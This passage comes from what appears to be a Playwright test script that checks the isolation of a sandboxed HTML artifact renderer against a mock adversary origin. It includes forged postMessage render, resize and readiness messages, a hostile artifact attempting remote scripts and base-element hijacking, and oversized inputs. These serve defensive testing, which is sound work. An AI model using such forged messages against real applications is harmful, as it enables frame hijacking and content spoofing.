      const survived = await artifact
        .evaluate(() => (window.__navigation ? window.__navigation.slice() : null))
        .catch(() => null);
      assert.ok(
        survived === null || Array.isArray(survived),
        named("the artifact frame is readable or gone, never someone else's"),
      );
    }
  });

  /* ---- the artifact's own policy, with the shell's headers taken away ---- */

  await withContext("inner-policy-alone", async (context) => {
    /* Every directive the srcdoc declares is also declared, more strictly, by
       the response the artifact inherits -- so in every other case the inner
       policy could be deleted outright and nothing would fail. Here the shell is
       served under a policy that grants everything, and the artifact has to be
       contained by its own `meta` element alone. This is what stops a future
       loosening of the shell's headers from silently widening the artifact. */
    const evilBefore = state.evil.requests.length;
    const contentBefore = state.app.contentRequests.length;
    const { page, renderer } = await openViewer(
      context,
      appOrigin,
      renderOrigin,
      `?artifact=hostile&rendererPath=${encodeURIComponent(PERMISSIVE_PREFIX)}`,
    );
    await waitFor(
      async () => (await rendererState(renderer)).state === "rendered",
      named("the artifact never rendered under the permissive shell policy"),
    );
    const artifact = await waitFor(() => artifactFrameOf(page), named("no artifact frame"));
    await waitFor(
      () => artifact.evaluate(() => window.__attempts && window.__attempts.origin !== undefined),
      named("the artifact never ran under the permissive shell policy"),
    );
    const settled = await waitFor(
      async () => {
        const fetches = await artifact.evaluate(() => window.__fetches);
        return Object.values(fetches).every((outcome) => outcome !== "pending") ? fetches : false;
      },
      named("a request probe never settled under the permissive shell policy"),
    );
    await new Promise((r) => setTimeout(r, 1000));

    const observed = await artifact.evaluate(() => ({
      baseURI: document.baseURI,
      nestedFrames: window.frames.length,
      evilScriptRan: window.__evilScriptRan === true,
      origin: String(window.origin),
    }));
    assert.equal(observed.origin, "null", named("the artifact is still opaque under a permissive shell"));
    assert.ok(!observed.evilScriptRan, named("the inner policy alone stopped the remote script"));
    assert.ok(
      !observed.baseURI.startsWith(evilOrigin),
      named("the inner policy alone denied the hostile base element"),
    );
    for (const [name, outcome] of Object.entries(settled)) {
      assert.ok(
        typeof outcome === "string" && !outcome.startsWith("read:"),
        named(`the inner policy alone refused the ${name} request (saw ${outcome})`),
      );
    }
    assert.equal(
      state.app.contentRequests.length,
      contentBefore,
      named("the inner policy alone kept the artifact off the account API"),
    );
    assert.equal(
      state.evil.requests.length,
      evilBefore,
      named("the inner policy alone kept the artifact off the adversary origin"),
    );
  });

  /* ---- forged readiness, on the account side of the handshake ---- */

  await withContext("forged-readiness", async (context) => {
    /* The renderer end refuses forged render messages; this is the other end.
       A well-formed readiness message from the wrong window, or from the wrong
       origin, must not cause the account page to hand over the document -- the
       point of the handshake is that the reply goes to one window at one
       origin, and readiness is the half an attacker gets to speak first. */
    const { page, renderer } = await openViewer(
      context,
      appOrigin,
      renderOrigin,
      "?artifact=interactive&mode=manual",
    );
    await waitFor(
      async () => (await rendererState(renderer)).state === "waiting",
      named("the renderer never reached its waiting state"),
    );
    const sentAfterRealReady = await page.evaluate(() => window.__app.sent);
    assert.equal(sentAfterRealReady, 0, named("manual mode sent nothing on the real readiness"));

    /* Right origin, wrong window: a second renderer frame on the same origin. */
    await page.evaluate(() => window.__addSecondRenderer());
    await waitFor(
      () => page.evaluate(() => window.__app.refused.includes("window")),
      named("a readiness message from a second renderer frame was not refused"),
    );

    /* Wrong origin, from a frame that speaks the protocol perfectly. */
    await page.evaluate((origin) => window.__addForeignFrame(origin), evilOrigin);
    await waitFor(
      () => page.evaluate(() => window.__app.refused.includes("origin")),
      named("a readiness message from the wrong origin was not refused"),
    );

    assert.equal(
      await page.evaluate(() => window.__app.sent),
      0,
      named("no forged readiness caused the document to be sent"),
    );
    assert.equal(
      (await rendererState(renderer)).frames,
      0,
      named("no forged readiness caused anything to render"),
    );
  });

  /* ---- forged messages ---- */

  await withContext("forged-render", async (context) => {
    const { page, renderer } = await openViewer(
      context,
      appOrigin,
      renderOrigin,
      "?artifact=interactive&mode=manual",
    );
    await waitFor(
      async () => (await rendererState(renderer)).state === "waiting",
      named("the renderer never reached its waiting state"),
    );

    /* Right origin, wrong window: a sibling frame on the account origin reaches
       the renderer's window object and sends a flawless message. */
    await page.evaluate(() => window.__addSibling());
    await waitFor(() => page.evaluate(() => window.__siblingReady === true), named("the sibling never loaded"));
    await page.evaluate(() => {
      const sibling = document.getElementById("sibling").contentWindow;
      sibling.__forge("<!doctype html><p id=forged>forged</p>");
    });
    await waitFor(
      async () => (await rendererState(renderer)).rejections.includes("wrong-window"),
      named("a message from a sibling window was not refused"),
    );
    assert.equal(
      (await rendererState(renderer)).frames,
      0,
      named("a message from a sibling window rendered nothing"),
    );
    assert.equal(artifactFrameOf(page), undefined, named("no forged artifact frame exists"));

    /* Right window, wrong origin: a second instance mounted against the same
       parent but configured for a different application origin. */
    const forged = await renderer.evaluate(async (evil) => {
      const module = await import("./renderer.js");
      const container = document.createElement("div");
      container.id = "probe";
      document.body.appendChild(container);
      window.__probe = module.mountRenderer({
        parentWindow: window.parent,
        appOrigin: evil,
        container,
      });
      return window.__probe.state();
    }, evilOrigin);
    assert.equal(forged, "waiting", named("the probe instance mounted and is listening"));
    await page.evaluate(() => window.__send());
    await waitFor(
      () => renderer.evaluate(() => window.__probe.rejections().includes("wrong-origin")),
      named("a message from the wrong origin was not refused"),
    );
    assert.equal(
      await renderer.evaluate(() => document.getElementById("probe").children.length),
      0,
      named("a message from the wrong origin rendered nothing"),
    );

    /* The correctly configured instance did accept that same message, so the
       case above is about the origin check rather than about a message nothing
       would have accepted. The frame count is read from the DOM rather than from
       the published state attribute, because for as long as the probe exists two
       instances are writing that attribute and the later writer wins. */
    await waitFor(
      async () => (await rendererState(renderer)).frames === 1,
      named("the correctly configured instance did not render the same message"),
    );
    await renderer.evaluate(() => {
      window.__probe.dispose();
      document.getElementById("probe").remove();
    });

    /* One artifact per instance. */
    await page.evaluate(() => window.__send());
    await waitFor(
      async () => (await rendererState(renderer)).rejections.includes("already-rendered"),
      named("a second artifact was not refused"),
    );
    assert.equal(
      (await rendererState(renderer)).frames,
      1,
      named("a second artifact did not replace the first"),
    );

    /* A message from the artifact itself -- a child window -- is refused for the
       same reason a sibling's is, and no message it can invent is a protocol.
       The refusal log is a set of distinct reasons, so the evidence here is the
       outcome rather than a count: a rendered artifact that stays the rendered
       artifact, with `wrong-window` recorded and nothing new alongside it. */
    const artifact = await waitFor(() => artifactFrameOf(page), named("no artifact frame to speak from"));
    const beforeArtifact = await rendererState(renderer);
    const originalHtml = await artifact.evaluate(() => document.body.innerHTML);
    await artifact.evaluate(() => {
      for (let attempt = 0; attempt < 50; attempt += 1) {
        parent.postMessage({ type: "archon:render", v: 1, html: "<p id=hijacked>from the artifact</p>" }, "*");
        parent.postMessage({ type: "archon:resize", v: 1, height: 9000 }, "*");
        parent.postMessage("archon:ready", "*");
      }
    });
    await new Promise((r) => setTimeout(r, 500));
    const afterArtifact = await rendererState(renderer);
    assert.deepEqual(
      afterArtifact.rejections,
      beforeArtifact.rejections,
      named("the artifact's messages added no new refusal reason"),
    );
    assert.ok(
      afterArtifact.rejections.includes("wrong-window"),
      named("a message from the artifact is refused as the wrong window"),
    );
    assert.equal(afterArtifact.frames, 1, named("the artifact could not cause a second render"));
    assert.equal(
      await artifactFrameOf(page).evaluate(() => document.body.innerHTML),
      originalHtml,
      named("the artifact could not replace what the reader is looking at"),
    );
    /* A hundred and fifty messages counted, and the reason log is still four
       entries at most: the set is what stops an artifact from growing an
       unbounded array and rejoining it on every message, in the same tab as the
       account page, while the counter keeps the refusals countable. */
    assert.ok(
      afterArtifact.refusals > beforeArtifact.refusals + 100,
      named(`every artifact message was counted (saw ${afterArtifact.refusals})`),
    );
    assert.ok(
      afterArtifact.rejections.length <= 4,
      named(`the reason log stays bounded (saw ${afterArtifact.rejections.length})`),
    );
  });

  /* ---- malformed and oversized messages ---- */

  await withContext("malformed-messages", async (context) => {
    const { page, renderer } = await openViewer(
      context,
      appOrigin,
      renderOrigin,
      "?artifact=interactive&mode=manual",
    );
    await waitFor(
      async () => (await rendererState(renderer)).state === "waiting",
      named("the renderer never reached its waiting state"),
    );

    const malformed = await page.evaluate(() => {
      const messages = [
        null,
        "archon:render",
        42,
        ["archon:render", 1, "<p>x</p>"],
        { type: "archon:render", v: 1 },
        { type: "archon:render", v: 2, html: "<p>x</p>" },
        { type: "archon:render", v: "1", html: "<p>x</p>" },
        { type: "archon:ready", v: 1 },
        { type: "archon:resize", v: 1, html: "<p>x</p>" },
        { type: "archon:render", v: 1, html: "<p>x</p>", documentId: "d1" },
        { type: "archon:render", v: 1, html: "" },
        { type: "archon:render", v: 1, html: "a\u0000b" },
        { type: "archon:render", v: 1, html: 5 },
        { type: "archon:render", v: 1, html: "a".repeat(2097153) },
      ];
      for (const message of messages) window.__send(message);
      return messages.length;
    });

    await waitFor(
      async () => (await rendererState(renderer)).refusals >= malformed,
      named("not every malformed message was refused"),
    );
    const refused = await rendererState(renderer);
    assert.ok(
      refused.rejections.every((reason) => reason === "malformed"),
      named("every malformed message was refused as malformed"),
    );
    assert.equal(refused.frames, 0, named("no malformed message rendered anything"));
    assert.equal(refused.state, "refused", named("a refused renderer says so"));
    assert.match(refused.status, /could not be displayed/i, named("a refusal is announced"));
    const role = await renderer.evaluate(
      () => document.querySelector("[data-archon-status]").getAttribute("role"),
    );
    assert.equal(role, "status", named("the refusal message is a live region"));

    /* Refusing is not settling: the instance is still open for the real one. */
    await page.evaluate(() => window.__send());
    await waitFor(
      async () => (await rendererState(renderer)).state === "rendered",
      named("a valid message after a refused one still renders"),
    );
  });

  /* ---- the renderer never arriving is a recoverable state on the account origin ---- */

  await withContext("renderer-unavailable", async (context) => {
    const { page } = await openViewer(
      context,
      appOrigin,
      renderOrigin,
      "?artifact=interactive&rendererPath=/no-such-page",
    );
    await waitFor(
      () => page.evaluate(() => window.__app.unavailable === true),
      named("the account page never reached its unavailable state"),
    );
    const fallback = await page.evaluate(() => ({
      status: document.getElementById("status").textContent,
      artifactOnAccountOrigin: document.body.innerHTML.includes("Quarterly report"),
    }));
    assert.match(fallback.status, /could not be displayed/i, named("the account page explains the failure"));
    assert.ok(
      !fallback.artifactOnAccountOrigin,
      named("no HTML fallback was rendered on the account origin"),
    );
    assert.equal(artifactFrameOf(page), undefined, named("no artifact frame exists after a failed renderer"));
  });

  /* ---- the renderer address carries nothing ---- */

  await withContext("renderer-url-parameters", async (context) => {
    /* An `about:srcdoc` document inherits its parent's base URL, so anything in
       the renderer's own query or fragment is readable by the artifact as
       `document.baseURI` -- and the artifact's `base-uri 'none'` means it cannot
       be neutralised afterwards. The renderer therefore refuses to mount at all
       when its address carries either, which is what stops a future viewer edit
       like `?doc=<id>` from handing a document identifier to the author of
       arbitrary uploaded HTML. */
    for (const suffix of ["?doc=d1", "#share-token"]) {
      const page = await context.newPage();
      await page.goto(`${renderOrigin}/${suffix}`);
      const observed = await rendererState(page.mainFrame());
      assert.equal(observed.state, "unconfigured", named(`the renderer refuses ${suffix}`));
      assert.equal(observed.frames, 0, named(`the renderer renders nothing for ${suffix}`));
      await page.close();
    }

    /* And the same page with a bare address still mounts, so the case above is
       about the parameter rather than about a renderer that never works. */
    const clean = await context.newPage();
    await clean.goto(`${renderOrigin}/`);
    assert.equal(
      (await rendererState(clean.mainFrame())).state,
      "standalone",
      named("a bare renderer address still mounts"),
    );
  });

  /* Proof of work. A matrix that returned early, threw into a swallowing catch
     or skipped an engine would reach this line with a short list. */
  assert.deepEqual(completed, [...MATRIX_CASES], named("every matrix case ran, in order"));
  return { completed, policies };
}

/* ------------------------------------------------------------------ *
 * Worker entry point.
 * ------------------------------------------------------------------ */

async function worker() {
  const nonce = process.env.AHU005_NONCE;
  if (typeof nonce !== "string" || !NONCE_PATTERN.test(nonce)) {
    die("scripts/test-hosted-renderer.mjs --worker is a supervised entry point");
  }
  const tempRoot = process.env.AHU005_TEMP_ROOT;
  if (typeof tempRoot !== "string" || tempRoot.length === 0 || !existsSync(tempRoot)) {
    die("scripts/test-hosted-renderer.mjs --worker requires its supervised temporary root");
  }
  const entry = join(tempRoot, "node_modules", "playwright", "index.js");
  if (!existsSync(entry)) die(`the pinned ${PLAYWRIGHT} install is not present`);
  const loaded = await import(pathToFileURL(entry).href);
  const playwright = loaded.chromium !== undefined ? loaded : loaded.default;

  /* The two copies of the contract, and the build's refusal to be injected
     into, are decided without a browser. They come first so a drift between the
     application and the renderer fails in two seconds rather than after two
     browser downloads. */
  const rendererModule = await import(pathToFileURL(join(ROOT, "renderer/public/renderer.js")).href);
  await assertContractParity(rendererModule);
  await assertBuildRefusesInjection();
  await assertBuildRefusesUnsafeTargets(tempRoot);
  await assertBuildRefusesUndeclaredPublicFile(tempRoot);
  await assertRendererDeploymentConfig();

  const state = {
    app: { requests: [], contentRequests: [], contentReads: [], mutations: [] },
    renderer: { requests: [] },
    evil: { requests: [] },
  };
  const config = { renderOrigin: "", artifacts: {} };
  const bundle = { headers: [], files: new Map() };

  const app = await startApp(state.app, config);
  const renderer = await startRenderer(bundle, state.renderer);
  const evil = await startEvil(state.evil, config);
  config.renderOrigin = renderer.origin;

  const opened = [];
  try {
    const build = await import(pathToFileURL(join(ROOT, "renderer/scripts/build.mjs")).href);
    const distDir = join(tempRoot, "dist");
    await build.buildRenderer({
      outDir: distDir,
      production: false,
      env: { HOSTED_APP_ORIGIN: app.origin, HOSTED_RENDER_ORIGIN: renderer.origin },
    });
    const built = await loadRendererBundle(distDir);
    bundle.headers = built.headers;
    bundle.files = built.files;

    await assertBuildOutputIsStatic(tempRoot, app.origin, renderer.origin);

    config.artifacts.interactive = INTERACTIVE_ARTIFACT;
    config.artifacts.hostile = hostileArtifact({ appOrigin: app.origin, evilOrigin: evil.origin });
    config.artifacts.fragments = FRAGMENT_ARTIFACT;
    config.artifacts["self-navigation"] = selfNavigatingArtifact({ evilOrigin: evil.origin });

    const versions = [];
    let cases = null;
    let policies = new Map();
    for (const engine of ENGINES) {
      const browser = await playwright[engine].launch();
      opened.push(browser);
      versions.push(`${engine} ${browser.version()}`);
      const result = await runMatrix({
        engine,
        browser,
        appOrigin: app.origin,
        renderOrigin: renderer.origin,
        evilOrigin: evil.origin,
        state,
        headers: bundle.headers,
      });
      /* Both engines run the same list, so a per-engine skip is a mismatch here
         as well as a short list inside the matrix. */
      if (cases === null) cases = result.completed;
      else assert.deepEqual(result.completed, cases, `${engine} ran a different set of cases`);
      policies = result.policies;
    }

    /* The policies this run actually validated, recorded where a reviewer of a
       CI log can read them without rerunning anything. */
    for (const [name, value] of policies) {
      process.stdout.write(`INFO  ${name} policy: ${value}\n`);
    }
    process.stdout.write(
      `PASS  hosted renderer isolation matrix (${versions.join(", ")}; ${cases.length} cases per engine)\n`,
    );
  } finally {
    for (const browser of opened) await browser.close();
    await app.close();
    await renderer.close();
    await evil.close();
  }
}

/* ------------------------------------------------------------------ */

const argv = process.argv.slice(2);
if (argv[0] === "--worker") {
  if (argv.length !== 1) die("usage: scripts/test-hosted-renderer.mjs --worker");
  worker().catch((error) => {
    process.stderr.write(`${error && error.stack ? error.stack : error}\n`);
    process.exit(1);
  });
} else if (argv.length === 0) {
  parent().catch((error) => {
    process.stderr.write(`${error && error.stack ? error.stack : error}\n`);
    process.exit(1);
  });
} else {
  die("usage: scripts/test-hosted-renderer.mjs");
}
